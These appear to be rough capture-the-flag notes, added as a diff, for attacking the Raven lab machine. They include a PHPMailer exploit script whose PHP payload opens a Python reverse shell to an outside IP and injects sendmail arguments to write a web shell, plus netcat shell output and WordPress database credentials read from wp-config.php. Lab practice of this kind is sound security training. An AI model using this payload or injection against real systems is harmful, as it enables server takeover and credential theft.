@@ -1,0 +1,71 @@
+
+
+
+
+http://raven.local/wordpress/wp-content/uploads/2018/11/flag3.png
+
+http://raven.local/vendor/PATH
+/var/www/html/vendor/
+flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}
+
+└─$ searchsploit -m 40974.py
+r//emote code execution vuln
+  '''
+  target = 'http://192.168.56.124/contact.php'
+  backdoor = '/shell.php'
+
+  payload = '<?php system(\'python -c """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\'192.168.0.12\\\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])"""\'); ?>'
+  fields={'action': 'submit',
+          'name': payload,
+          'email': '"anarcoder\\\" -OQueueDirectory=/tmp -X/vat/www/html/shell.php server\" @protonmail.com',
+          'message': 'Pwned'}
+
+  m = MultipartEncoder(fields=fields,
+                      boundary='----WebKitFormBoundaryzXJpHSq4mNy35tHe')
+
+  headers={'User-Agent': 'curl/7.47.0',
+          'Content-Type': m.content_type}
+
+  proxies = {'http': 'localhost:8081', 'https':'localhost:8081'}
+
+
+  print('[+] SeNdiNG eVIl SHeLL To TaRGeT....')
+  r = requests.post(target, data=m.to_string(),
+                    headers=headers)
+  print('[+] SPaWNiNG eVIL sHeLL..... bOOOOM :D')
+  r = requests.get(target+backdoor, headers=headers)
+  if r.status_code == 200:
+      print('[+]  ExPLoITeD ' + target)
+  '''
+
+
+└─$ nc -nvlp 8821
+listening on [any] 8821 ...
+connect to [192.168.56.105] from (UNKNOWN) [192.168.56.124] 50264
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+www-data@Raven:/var/www$ ls
+ls
+flag2.txt  html
+www-data@Raven:/var/www$ cat flag2.txt
+cat flag2.txt
+flag2{6a8ed560f0b5358ecf844108048eb337}
+
+
+www-data@Raven:/var/www/html$ cd wordpress
+cd wordpress
+cat wp-config.php
+
+  / ** MySQL settings - You can get this info from your web host ** //
+  /** The name of the database for WordPress */
+  define('DB_NAME', 'wordpress');
+
+  /** MySQL database username */
+  define('DB_USER', 'root');
+
+  /** MySQL database password */
+  define('DB_PASSWORD', 'R@v3nSecurity');
+
+//after use linpeas, nothing useful found. read the walkthrough, where the mysql vuln is used, but not as descripted as the vulns. so I quit.！
